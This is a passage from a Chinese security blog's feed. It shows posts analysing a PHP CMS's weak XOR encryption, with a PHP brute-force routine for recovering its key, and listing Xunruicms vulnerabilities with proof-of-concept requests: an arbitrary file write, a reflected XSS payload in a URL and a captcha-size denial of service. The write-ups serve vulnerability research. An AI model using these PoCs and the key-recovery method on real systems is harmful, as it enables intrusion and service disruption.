</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">decrypt</span><span class="p">(</span><span class="nv">$txt</span><span class="p">,</span> <span class="nv">$key</span> <span class="o">=</span> <span class="s1">&#39;_qscms&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// $txt 的结果为加密后的字串经过 base64 解码，然后与私有密匙一起，
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 经过 passport_key() 函数处理后的返回值
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="nv">$txt</span> <span class="o">=</span> <span class="nx">passport_key</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$txt</span><span class="p">),</span> <span class="nv">$key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 变量初始化
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="nv">$tmp</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// for 循环，$i 为从 0 开始，到小于 $txt 字串长度的整数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$txt</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// $tmp 字串在末尾增加一位，其内容为 $txt 的第 $i 位，
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 与 $txt 的第 $i + 1 位取异或。然后 $i = $i + 1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="nv">$tmp</span> <span class="o">.=</span> <span class="nv">$txt</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">^</span> <span class="nv">$txt</span><span class="p">[</span><span class="o">++</span><span class="nv">$i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 返回 $tmp 的值作为结果
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$tmp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">passport_key</span><span class="p">(</span><span class="nv">$txt</span><span class="p">,</span> <span class="nv">$encrypt_key</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 将 $encrypt_key 赋为 $encrypt_key 经 md5() 后的值
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="nv">$encrypt_key</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$encrypt_key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 变量初始化
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ctr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$tmp</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// for 循环，$i 为从 0 开始，到小于 $txt 字串长度的整数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$txt</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// 如果 $ctr = $encrypt_key 的长度，则 $ctr 清零
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="nv">$ctr</span> <span class="o">=</span> <span class="nv">$ctr</span> <span class="o">==</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$encrypt_key</span><span class="p">)</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="nv">$ctr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// $tmp 字串在末尾增加一位，其内容为 $txt 的第 $i 位，
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 与 $encrypt_key 的第 $ctr + 1 位取异或。然后 $ctr = $ctr + 1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">      <span class="c1">//   echo ord($txt[$i]);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="nv">$tmp</span> <span class="o">.=</span> <span class="nv">$txt</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">^</span> <span class="nv">$encrypt_key</span><span class="p">[</span><span class="nv">$ctr</span><span class="o">++</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="c1">//  echo $tmp;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 返回 $tmp 的值作为结果
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$tmp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>虽然我不会密码学,但我也知道异或加密是不安全的. 于是开始对这函数开始分析.</p>
<h4 id="异或加密简介">异或加密简介</h4>
<p>异或的定义为 两个值相同时就返回0,否则返回1.  异或的特性为 对这个数进行两次异或会返回这个值本身.</p>
<p>它有以下性质 设密文为<code>A</code>  用来异或的密钥为<code>B</code>. 如果<code>B</code>二进制表示全为<code>0</code>  则写为0</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">A^0 = A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">A^A = 0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">(A^B)^C = A^(B^c)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">(A^B)^A = B^(A^A) = B^0 = B 
</span></span></code></pre></td></tr></table>
</div>
</div><p>例如 <code>0000000</code>^<code>10101111</code>,由于左侧都是0,所以右侧为0的还是0,1的还是1.导致并没有任何改变.</p>
<h3 id="对加密函数的思考">对加密函数的思考</h3>
<p>为了将问题分解, 首先对<code>passport_key</code>函数分析.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="nv">$encrypt_key</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$encrypt_key</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>查看了<code>cms</code>对这个函数的调用, 实际传递的key是一个固定的<code>16</code>位随机生成数 . 所以爆破这个md5是不可能的. 但是可以发现实际上加密没用到这个<code>$encrypt_key</code>本身的值.</p>
<p>所以问题可以简化为 获取这个<code>$encrypt_key</code>的值.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// for 循环，$i 为从 0 开始，到小于 $txt 字串长度的整数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$txt</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// 如果 $ctr = $encrypt_key 的长度，则 $ctr 清零
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="nv">$ctr</span> <span class="o">=</span> <span class="nv">$ctr</span> <span class="o">==</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$encrypt_key</span><span class="p">)</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="nv">$ctr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// $tmp 字串在末尾增加一位，其内容为 $txt 的第 $i 位，
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 与 $encrypt_key 的第 $ctr + 1 位取异或。然后 $ctr = $ctr + 1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">      <span class="c1">//   echo ord($txt[$i]);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="nv">$tmp</span> <span class="o">.=</span> <span class="nv">$txt</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">^</span> <span class="nv">$encrypt_key</span><span class="p">[</span><span class="nv">$ctr</span><span class="o">++</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="c1">//  echo $tmp;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这段代码可以总结为 用<code>$encrypt_key</code>对<code>$txt</code>逐位异或.</p>
<p>从上面的知识知道 利用<code>A^0</code>的特性, 传递<code>0</code>,  返回值将也是<code>$encrypt_key</code></p>
<p>也就是只要我们可控<code>$txt</code>, 甚至不需要任何解密操作, 直接就能从返回值得到密钥.</p>
<p>但是<code>cms</code>并未直接调用这个函数, 需要进一步分析<code>decrypt</code>函数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span> 
</span></span><span class="line"><span class="cl"> <span class="c1">// 经过 passport_key() 函数处理后的返回值
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="nv">$txt</span> <span class="o">=</span> <span class="nx">passport_key</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$txt</span><span class="p">),</span> <span class="nv">$key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 变量初始化
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="nv">$tmp</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// for 循环，$i 为从 0 开始，到小于 $txt 字串长度的整数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$txt</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// $tmp 字串在末尾增加一位，其内容为 $txt 的第 $i 位，
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 与 $txt 的第 $i + 1 位取异或。然后 $i = $i + 1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="nv">$tmp</span> <span class="o">.=</span> <span class="nv">$txt</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">^</span> <span class="nv">$txt</span><span class="p">[</span><span class="o">++</span><span class="nv">$i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这个函数将<code>passport_key</code>返回值两位两位异或后返回,导致返回值位数减半.</p>
<p>考虑我们之前的利用, 在这个函数运行后得到的其实是8位密钥两两异或后的值.</p>
<p>如果对异或值进行爆破, 密钥的值范围也就是<code>php</code>的<code>md5</code>函数的返回值范围  <code>a-z0-9</code>.</p>
<p>编写一个爆破函数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">crack</span><span class="p">(</span><span class="nv">$char</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$ret</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 可能的值范围
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="nv">$chars</span> <span class="o">=</span> <span class="s1">&#39;0123456789abcdefghijklmnopqrstuvwxyz&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="nv">$i2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i2</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">);</span> <span class="nv">$i2</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// 如果异或后的值为要破解的字符 就加入返回数组
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span> <span class="p">(</span><span class="nv">$chars</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">^</span> <span class="nv">$chars</span><span class="p">[</span><span class="nv">$i2</span><span class="p">])</span> <span class="o">===</span>  <span class="nv">$char</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="nv">$ret</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$chars</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="nv">$chars</span><span class="p">[</span><span class="nv">$i2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>尝试破解一个字符</p>
<p><code>var_dump(crack(&quot;v&quot;));</code></p>
<p>实际返回为</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">array(18) {
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  [0]=&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  string(2) &#34;A7&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  // 省略
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> }
</span></span></code></pre></td></tr></table>
</div>
</div><p>实际上单个字符的可能性空间是不定的,<code>18</code>是最少的了  而md5一共有32位字符 ,也就是最少也有<code>18^16=1.21439531e20</code>种组合,不可能两个字符两个字符的爆破成功.</p>
<p>不过这只是表象, 计算一下就会发现</p>
<p>设未知字符为<code>x1</code>,<code>x2</code>,爆破出来的是<code>y1</code>,<code>y2</code>,加密的两个字符是<code>z1,z2</code></p>
<p>证</p>
<p><code>(z1^x1)^(z2^x2) </code> 根据上面的交换律解括号得到 <code>(x1^x2)^z1^z2</code> 然<code>(y1^y2)=(x1^x2)</code></p>
<p>得<code>(z1^x1)^(z2^x2)=(z1^y1)^(z2^y2)</code></p>
<p>所以只需要随便在可能里选一种就行.</p>
<h4 id="利用">利用</h4>
<p>已知加密是弱加密,只需要有一处可控输入和可知输出的接口就可以利用. 尝试搜索<code>decrypt</code>函数</p>
<p><img src="https://i.loli.net/2019/12/23/2MLDQWvEzOAsiN9.png" alt="2019-12-23 23-37-31 的屏幕截图.png"></p>
<p>只发现这处函数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">get_font_img</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$str</span> <span class="o">=</span> <span class="nx">I</span><span class="p">(</span><span class="s1">&#39;request.str&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;trim&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// 异或加密
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="nv">$str</span> <span class="o">=</span> <span class="nx">decrypt</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span><span class="nx">C</span><span class="p">(</span><span class="s1">&#39;PWDHASH&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">\Common\ORG\Image</span><span class="o">::</span><span class="na">buildString</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="mi">50</span><span class="p">),</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;png&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="k">false</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>满足条件,但是输出的是图片比较尴尬,尝试了一下全<code>\x00</code></p>
<p><img src="https://i.loli.net/2019/12/23/MYl7UGFCTHSQExA.png" alt="image.png"> 虽说参数故意没添加干扰,这也没法肉眼辨认可能的不可视字符.</p>
<p>只能通过更改攻击载荷来使得下面的字符变得可视化，只需要最后再与攻击载荷再进行一次异或就行了．</p>
]]></content></item><item><title>Xunruicms</title><link>https://blue-bird1.github.io/posts/xunruicms/</link><pubDate>Mon, 09 Dec 2019 00:07:02 +0800</pubDate><guid>https://blue-bird1.github.io/posts/xunruicms/</guid><description>前言 前几天寻思着想挖几个通用的洞 于是在fofa poc列表上找找目标. 锁定目标为php cms 已有0day. 很快就锁定到了这个迅睿cms. 发现可以在</description><content type="html"><![CDATA[<h3 id="前言">前言</h3>
<p>前几天寻思着想挖几个通用的洞 于是在fofa poc列表上找找目标. 锁定目标为<code>php</code> <code>cms</code> <code>已有0day</code>.
<img src="https://i.loli.net/2019/12/09/v7qHp1y3ZCaJ6hB.png" alt="2019-12-09 00-09-38 的屏幕截图.png">
很快就锁定到了这个<code>迅睿cms</code>. 发现可以在gitee上下载.</p>
<p>废了好大力气 最后在fofa扫的时候才发现寥寥无几 基本可以忽略. 心态十分爆炸</p>
<h3 id="上传文件">上传文件</h3>
<p>转移了<code>&lt;&gt;</code> 危害不大</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// 漏洞代码
</span></span><span class="line"><span class="cl">  /**
</span></span><span class="line"><span class="cl">     * 存储临时表单内容
</span></span><span class="line"><span class="cl">     */
</span></span><span class="line"><span class="cl">    public function save_form_data() {
</span></span><span class="line"><span class="cl">        // fixme 文件写入 但是由于转义了&lt; 所以无法命令
</span></span><span class="line"><span class="cl">        $rt = \Phpcmf\Service::L(&#39;cache&#39;)-&gt;init(&#39;file&#39;)-&gt;save(
</span></span><span class="line"><span class="cl">            dr_safe_filename(\Phpcmf\Service::L(&#39;input&#39;)-&gt;get(&#39;name&#39;)),
</span></span><span class="line"><span class="cl">            \Phpcmf\Service::L(&#39;input&#39;)-&gt;post(&#39;data&#39;),
</span></span><span class="line"><span class="cl">            7200
</span></span><span class="line"><span class="cl">        );
</span></span><span class="line"><span class="cl">        var_dump($rt);
</span></span><span class="line"><span class="cl">        exit;
</span></span><span class="line"><span class="cl">    }
</span></span></code></pre></td></tr></table>
</div>
</div><p>poc</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /index.php?c=api&amp;m=save_form_data&amp;s=api&amp;name=test.html 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">data: hello world
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="反射xss">反射XSS</h3>
<p>需登录 且有权限上传文件</p>
<p>poc <code>http://127.0.0.1:8080/index.php?c=file&amp;m=input_file_url&amp;s=api&amp;name=1%22%20onfocus=%22alert(%27xss%27);%20autofocus%20%22&amp;fid=1</code></p>
<h3 id="验证码dos">验证码dos</h3>
<p>poc <code>http://127.0.0.1:8080/index.php?c=api&amp;m=captcha&amp;s=api&amp;width=4000&amp;height=4000</code></p>
]]></content></item><item><title>漏洞挖掘技巧</title><link>https://blue-bird1.github.io/posts/bug/</link><pubDate>Sun, 08 Dec 2019 12:01:04 +0800</pubDate><guid>https://blue-bird1.github.io/posts/bug/</guid><description>仅作为个人的漏洞类型和技巧记录 于阅读漏洞报告时记录 类型 不需要特殊技巧 简单就可以确认的类型 GraphQL查询漏洞 Graphql作为一种前端查询</description><content type="html"><![CDATA[<p>仅作为个人的漏洞类型和技巧记录 于阅读漏洞报告时记录</p>
<h2 id="类型">类型</h2>
<p>不需要特殊技巧 简单就可以确认的类型</p>
<h3 id="graphql查询漏洞">GraphQL查询漏洞</h3>
<p>Graphql作为一种前端查询语言 如未对查询进行限制 可以构造恶意查询 恶意消耗服务器资源.同时GraphQl的权限限制也是一大漏洞点</p>
<h4 id="参考">参考</h4>
<p><a href="https://graphql.org/learn/">https://graphql.org/learn/</a></p>
